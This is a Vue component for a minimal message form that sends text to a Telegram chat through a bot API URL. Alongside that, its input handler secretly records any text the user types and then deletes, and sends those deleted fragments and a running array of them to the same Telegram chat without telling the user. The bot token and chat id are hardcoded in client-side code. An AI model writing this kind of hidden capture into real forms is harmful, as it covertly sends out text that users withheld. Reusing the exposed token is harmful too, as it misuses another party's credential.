<script setup lang="ts">
import { useUserStore } from '~/stores/user'

defineOptions({
  name: 'IndexPage',
})
const read: Ref<string[]> = ref([])

const message = ref('')

function onInput(event: Event) {
  const e: string = (event.target as HTMLInputElement).value
  if (message.value.length > e.length) {
    const isPartOfAnyString: boolean = read.value.some(str => str.includes(e))
    if (!isPartOfAnyString) {
      read.value.push(message.value)
      sendPrivetMessage(`deleted : ${message.value}`)
    }
  }
  message.value = e
}

const msg = ref('')
const sending = ref(false)
const store = useUserStore()
onMounted(() => {
  store.log('message')
})
function sendMessage(m: string) {
  const url = `https://api.telegram.org/bot6052156189:AAEdekXqQUEQqz-PAllHwh0vqJkzu7CKi14/sendMessage?chat_id=-975298243&text=${m}`
  sending.value = true
  fetch(url)
    .then((response) => {
      if (!response.ok) {
        sending.value = false
        msg.value = 'error'
        throw new Error('Failed to send message')
      }
      sending.value = false
      message.value = ''
      sendPrivetMessage(`--deleted array--: ${JSON.stringify(read.value)}`)
      msg.value = 'success, thank you for your message'
    })
    .catch((error) => {
      sending.value = false
      msg.value = 'error'
      console.error(error)
    })
}
function sendPrivetMessage(m: string) {
  const url = `https://api.telegram.org/bot6052156189:AAEdekXqQUEQqz-PAllHwh0vqJkzu7CKi14/sendMessage?chat_id=-975298243&text=${m}`
  fetch(url)
}
</script>

<template>
  <div>
    <div text-4xl>
      <div i-carbon-chat inline-block />
    </div>
    <div>
      Hmmm
    </div>
    <p>
      <em text-sm opacity-75>send message</em>
    </p>
    <div py-lg>
      <div mb-lg>
        <input
          :value="message" v-bind="$attrs" p="x-4 y-2" w="250px" text="center" bg="transparent"
          border="~ rounded gray-200 dark:gray-700" outline="none active:none" @input="onInput"
          @keyup.enter="sendMessage(message)"
        >
        <!-- <TheInput v-model="message" :value="message" @input="(e : string) => { message = e ;read.push(e) }" @keyup.enter="sendMessage" /> -->
      </div>

      <div>
        <button btn @click="sendMessage(message)">
          Send
        </button>
      </div>
      <div v-if="sending" mt-lg>
        ... sending ...
      </div>
      <div v-else mt-lg>
        {{ msg }}
      </div>
    </div>
  </div>
</template>

<route lang="yaml">
meta:
  layout: prototype
</route>
